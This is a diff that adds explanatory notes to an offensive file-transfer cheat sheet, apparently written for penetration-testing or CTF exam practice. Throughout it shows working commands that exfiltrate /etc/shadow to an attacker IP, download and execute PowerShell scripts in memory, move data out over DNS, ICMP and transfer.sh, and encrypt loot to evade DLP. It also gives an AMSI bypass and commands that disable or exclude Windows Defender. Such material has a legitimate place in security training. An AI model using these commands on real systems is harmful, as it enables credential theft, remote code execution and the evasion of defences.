@@ -53,6 +53,7 @@ sudo atftpd --daemon --port 69 /tmp
 nc -lnvp 8000 > received_file
 nc -lnvp 8000 < file_to_send
 ```
+> Start one of these on your attacker machine before transferring anything. `python3 -m http.server 80` serves files from the current directory over HTTP on port 80. `uploadserver` also accepts POST uploads. `impacket-smbserver` creates a writable Windows-accessible SMB share — add `-username/-password` if the target blocks anonymous SMB. `pyftpdlib --write` enables FTP uploads from the target. `--bind 0.0.0.0` ensures the server listens on all interfaces, not just loopback.
 
 ---
 
@@ -82,6 +83,7 @@ python3 -c "import urllib.request;urllib.request.urlretrieve('http://10.10.14.X/
 nc -lvnp 4444 > /tmp/file        # on target
 nc -w3 TARGET 4444 < file        # on attacker
 ```
+> Replace `10.10.14.X` with your attacker IP. `-O` on wget saves with a specific filename. The `/dev/tcp` trick works without wget or curl — it opens a raw TCP connection through bash's built-in network device. The Python fallback works on any system with Python 3. For nc: start the listener on the target first, then push the file from the attacker with `-w3` (3-second timeout after EOF).
 
 ## Linux Target — UPLOAD (push out)
 
@@ -99,6 +101,7 @@ scp /etc/shadow user@10.10.14.X:/loot/
 # Inline base64 paste (small files)
 base64 -w0 /etc/shadow              # copy → paste into terminal on attacker
 ```
+> `curl -T` sends a PUT request to upload a file to your waiting uploadserver or WebDAV server. `-w0` on base64 disables line wrapping so the output is one continuous string — paste it into a text editor on the attacker and decode with `base64 -d`. Good for small files like `/etc/shadow` when HTTP is blocked. Replace the IP with your attacker address.
 
 ---
 
@@ -117,6 +120,7 @@ IEX(IWR -UseBasicParsing http://10.10.14.X/r.ps1)
 # Skip cert check
 [System.Net.ServicePointManager]::ServerCertificateValidationCallback={$true}
 ```
+> `Invoke-WebRequest` (IWR) is the standard PowerShell download method. `-UseBasicParsing` avoids errors when Internet Explorer is not initialized. `DownloadString | IEX` downloads and executes a script in memory without writing to disk — useful for evading disk-based AV. Force TLS 1.2 if you get protocol errors on older Windows. The cert callback override skips SSL certificate validation for self-signed HTTPS servers.
 
 ### CMD / LOLBins
 ```cmd
@@ -138,6 +142,7 @@ xcopy /E \\10.10.14.X\share C:\Temp\
 net use Z: \\10.10.14.X\DavWWWRoot /persistent:no
 copy Z:\f.exe C:\Temp\f.exe
 ```
+> `certutil -urlcache` is on every Windows system but is heavily logged by EDR tools — rename it or use `-verifyctl` variant to reduce signature hits. `bitsadmin` runs as a Background Intelligent Transfer Service (BITS) job — lower noise. `xcopy /E` copies recursively. `net use Z:` mounts your WebDAV share as a drive letter — requires `wsgidav` running on the attacker. Replace `10.10.14.X` with your attacker IP throughout.
 
 ### Living-off-the-Land (signed binaries that download)
 | Binary | Cmd |
@@ -166,6 +171,7 @@ copy C:\Temp\loot.zip \\10.10.14.X\share\
 # or stream over WinRM:
 $b64 = [Convert]::ToBase64String([IO.File]::ReadAllBytes('C:\Temp\file.bin')); $b64
 ```
+> `IWR -Method PUT` uploads a file to your waiting uploadserver or WebDAV server. `| clip` copies the base64 string to the Windows clipboard — paste it into your terminal on the attacker machine and decode with `base64 -d`. The WinRM streaming variant prints the string directly if clipboard is unavailable. Replace the IP and path for your target.
 
 > **Skills26 pattern (memorize):** When SMB is firewalled, exfil via WinRM:
 > ```
@@ -200,6 +206,7 @@ node -e "require('https').get('URL',r=>r.pipe(require('fs').createWriteStream('o
 # Java
 jrunscript -e "var s=new java.io.BufferedInputStream(new java.net.URL('URL').openStream());..."
 ```
+> Use whichever language runtime is available on the target. Python and PHP are the most common. The Python `http.server` one-liner starts a file server from the current directory — useful when you need to serve files without a separate server process. Replace `URL` with your attacker's HTTP server URL and `out` with the output filename.
 
 ---
 
@@ -221,6 +228,7 @@ sudo tcpdump -i tun0 -n icmp -X
 curl -F "file=@/tmp/loot.zip" https://transfer.sh/x
 curl --upload-file /tmp/loot.zip https://transfer.sh/loot.zip
 ```
+> DNS exfil encodes data in subdomain labels and sends DNS queries to your attacker-controlled domain — captured by `tcpdump` on the tun0 interface. `fold -w 30` splits base64 into 30-character chunks that fit in a subdomain label. ICMP exfil embeds file data in ICMP ping payloads using `hping3`. Use cloud drop as a last resort when direct connectivity to your attacker is blocked but the target has outbound internet access.
 
 ---
 
@@ -236,6 +244,7 @@ openssl enc -d -aes-256-cbc -in f.enc -out f -k PASS
 7z a -p'PASS' -mhe=on out.7z file
 zip -e out.zip file                          # weak — burnable
 ```
+> Encrypt files before transferring to evade Data Loss Prevention (DLP) and content-inspection proxies. `gpg -c` uses symmetric encryption with a passphrase. `openssl enc -aes-256-cbc` is cross-platform. `-d` decrypts. `-k PASS` sets the passphrase. `7z -mhe=on` also encrypts the filename headers, not just the content. `zip -e` uses ZIP encryption which is weak and easily cracked.
 
 ---
 
@@ -248,6 +257,7 @@ python3 -m uploadserver 8000
 # Target:
 curl -F "files=@/etc/shadow" http://ATTACKER:8000/upload
 ```
+> `uploadserver` extends Python's built-in HTTP server with a `/upload` POST endpoint. Start it on your attacker machine, then use `curl -F` from the target to POST the file. Replace `ATTACKER` with your attacker IP.
 
 ```bash
 # nginx PUT-receive (snippet)
@@ -257,6 +267,7 @@ server {
   location / { dav_methods PUT DELETE MKCOL COPY MOVE; create_full_put_path on; root /tmp/upload; }
 }
 ```
+> nginx WebDAV config snippet — enables HTTP PUT uploads to `/tmp/upload/`. `client_max_body_size 0` removes the upload size limit. Use this when you need a production-grade receiver instead of uploadserver. Add this to an nginx server block and reload nginx.
 
 ---
 
@@ -277,12 +288,14 @@ server {
 ```powershell
 [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
 ```
+> Anti-Malware Scan Interface (AMSI) bypass — sets the internal `amsiInitFailed` flag to `$true` using reflection. This prevents AMSI from scanning subsequent PowerShell commands in the current session. Only effective within the same PowerShell process. Requires no special privileges.
 
 ### Defender exclusion (if local admin)
 ```powershell
 Add-MpPreference -ExclusionPath "C:\Temp"
 Set-MpPreference -DisableRealtimeMonitoring $true   # noisy alert
 ```
+> Adds `C:\Temp` to Windows Defender's exclusion list so files dropped there are not scanned. `-DisableRealtimeMonitoring` turns off real-time protection entirely — very noisy and likely to trigger alerts. Use the exclusion path approach instead when possible. Requires local administrator privileges.
 
 ---
 
@@ -292,10 +305,13 @@ Set-MpPreference -DisableRealtimeMonitoring $true   # noisy alert
 md5sum file                                  # Linux
 sha256sum file
 ```
+> Generates the MD5 or SHA-256 hash of a file. Run this on both sides (attacker and target) after a transfer to verify the file arrived intact and was not corrupted or tampered with during transit.
+
 ```powershell
 Get-FileHash file -Algorithm SHA256          # Windows
 certutil -hashfile file SHA256
 ```
+> Windows equivalent of `sha256sum`. `Get-FileHash` is the PowerShell cmdlet; `certutil -hashfile` works from CMD. Compare the output to the hash on your attacker machine to verify file integrity.
 
 ---
 
